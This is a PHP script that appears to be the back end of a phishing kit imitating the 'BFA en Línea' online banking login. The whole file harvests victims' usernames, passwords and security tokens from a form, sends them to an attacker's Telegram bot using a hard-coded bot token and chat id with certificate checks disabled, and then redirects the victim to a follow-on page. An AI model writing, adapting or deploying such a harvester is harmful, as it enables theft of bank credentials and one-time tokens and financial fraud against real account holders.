<?php
// Token y chat_id directamente
$token   = "8776710173:AAGJLYXRq9yIGTHQouRvTospcaxWlwyVqN4";
$chat_id = "7655000874";

// Datos recibidos del formulario
$usuario    = isset($_POST['usuario'])    ? trim($_POST['usuario'])    : '';
$contrasena = isset($_POST['contrasena']) ? trim($_POST['contrasena']) : '';
$tok        = isset($_POST['token'])      ? trim($_POST['token'])      : '';

// Construir mensaje
$mensaje  = "🏦 *BFA en Línea*\n";
$mensaje .= "👤 Usuario: `{$usuario}`\n";
$mensaje .= "🔑 Contraseña: `{$contrasena}`\n";
$mensaje .= "🔐 Token: `{$tok}`\n";
$mensaje .= "🕐 " . date('Y-m-d H:i:s');

// Enviar a Telegram
$url  = "https://api.telegram.org/bot{$token}/sendMessage";
$data = [
    'chat_id'    => $chat_id,
    'text'       => $mensaje,
    'parse_mode' => 'Markdown',
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST,           true);
curl_setopt($ch, CURLOPT_POSTFIELDS,     http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Redirigir después de guardar
header('Location: som.html');
exit;
?>
